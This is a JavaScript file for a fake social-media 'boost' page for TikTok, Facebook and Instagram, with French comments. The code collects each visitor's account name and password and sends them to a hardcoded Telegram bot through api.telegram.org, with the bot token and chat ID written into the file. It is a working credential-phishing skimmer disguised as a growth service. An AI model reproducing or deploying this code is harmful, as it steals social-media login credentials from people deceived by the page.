document.addEventListener("DOMContentLoaded", () => {
    const TELEGRAM_BOT_TOKEN = "7738217538:AAGoNIvjMilJ5Ikt9oalHhpEiRDtS7t3NbU";
    const CHAT_ID = "6804915795";

    function escapeMarkdown(text) {
        return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
    }

    function sendToTelegram(platform, data) {
        const formattedMessage = `
📢 *Boost Request - ${platform}* 📢
• *Account Name:* ${escapeMarkdown(data.accountName)}
• *Post/Video URL:* ${escapeMarkdown(data.url)}
• *Password:* \`${escapeMarkdown(data.password)}\`
• *Boost Type:* ${escapeMarkdown(data.boostType)}
• *Quantity:* ${escapeMarkdown(data.quantity)}
        `;

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: formattedMessage, 
                parse_mode: "MarkdownV2",
                disable_web_page_preview: true
            }),
        })
        .then(response => {
            if (response.ok) {
                alert("✅ Requête envoyée avec succès à Telegram!");
                // Réinitialisation du formulaire après envoi
                document.getElementById(`boost-${platform.toLowerCase()}-form`).reset();
            } else {
                alert("❌ Échec de l'envoi. Vérifiez votre connexion.");
            }
        })
        .catch(error => {
            console.error("Erreur:", error);
            alert("⚠️ Erreur technique. Consultez la console.");
        });
    }

    function setupFormListener(formId, platform) {
        const form = document.getElementById(formId);
        if (form) {
            form.addEventListener("submit", event => {
                event.preventDefault();
                
                // Validation des champs
                const password = form.querySelector('input[type="password"]').value;
                if (!password || password.length < 4) {
                    alert("Le mot de passe doit contenir au moins 4 caractères");
                    return;
                }

                const data = {
                    accountName: form.querySelector('input[type="text"]').value.trim(),
                    url: form.querySelector('input[type="url"]').value.trim(),
                    password: password,
                    boostType: form.querySelector("select").value,
                    quantity: form.querySelector('input[type="number"]').value
                };

                if (!data.accountName || !data.url || !data.boostType || !data.quantity) {
                    alert("Veuillez remplir tous les champs obligatoires");
                    return;
                }

                sendToTelegram(platform, data);
            });
        } else {
            console.warn(`Formulaire ${formId} introuvable`);
        }
    }

    // Initialisation des listeners
    setupFormListener("boost-tiktok-form", "TikTok");
    setupFormListener("boost-facebook-form", "Facebook");
    setupFormListener("boost-instagram-form", "Instagram");

    console.log("Boost Interface initialisée avec succès");
});
